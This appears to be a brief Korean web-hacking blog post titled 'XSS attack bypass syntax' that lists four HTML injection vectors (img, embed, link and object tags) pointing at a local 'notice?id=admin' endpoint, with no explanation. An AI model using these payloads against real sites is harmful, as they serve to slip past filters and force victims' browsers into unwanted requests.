---
layout: post
title: "XSS 공격 우회구문"
date: 2020-11-06
categories: WEB_HACKING
tags: [web,웹 취약점,xss,payload]
---

<img src="http://127.0.0.1:8000/notice?id=admin">
<embed src="http://127.0.0.1:8000/notice?id=admin"/> 
<link rel="stylesheet" href="http://127.0.0.1:8000/notice?id=admin">
<object data=’./notice?id=admin’ ></object>
